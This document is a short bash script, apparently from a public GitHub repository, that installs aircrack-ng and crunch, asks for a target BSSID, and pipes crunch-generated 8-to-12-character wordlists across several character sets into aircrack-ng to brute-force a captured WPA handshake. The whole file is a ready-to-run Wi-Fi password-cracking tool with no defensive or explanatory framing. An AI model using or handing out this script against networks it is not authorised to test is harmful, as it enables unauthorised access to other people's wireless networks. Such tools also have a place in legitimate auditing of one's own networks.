#!/bin/bash
#https://github.com/EvgenyD4/bash/blob/master/aircrack-ng_passwd.sh
clear

# Check if packages are installed
cat <<EOF >/tmp/inst_deb.txt;
aircrack-ng
crunch

EOF
for P in $(cat /tmp/inst_deb.txt);
 do echo " check install [ $P ]";
  if ! dpkg --get-selections $P 2> /dev/null | grep -oE install &> /dev/null;
   then sudo apt install $P; 
  fi;
 done

# Checking if a directory exists
dir="/home/$USER/NG"
if [ -d $dir ]; 
 then cd /home/$USER/NG
 else mkdir /home/$USER/NG
      cd /home/$USER/NG
fi

pwd
echo "";
echo " BSSID [F8:32:E4:44:73:A4]"
read B

# Generating a password from 8 to 12 characters
crunch 8 12 0123456789 | aircrack-ng -w - *.cap -b $B
crunch 8 12 0123456789qwertyuiopasdfghjklzxcvbnm | aircrack-ng -w - *.cap -b $B
crunch 8 12 0123456789QWERTYUIOPASDFGHJKLZXCVBNM\(\)\[\]\{\}\!\@\#\$ | aircrack-ng -w - *.cap -b $B
crunch 8 12 qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM | aircrack-ng -w - *.cap -b $B
crunch 8 12 0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM | aircrack-ng -w - *.cap -b $B
crunch 8 12 0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM\(\)\[\]\{\}\!\@\#\$ | aircrack-ng -w - *.cap -b $B
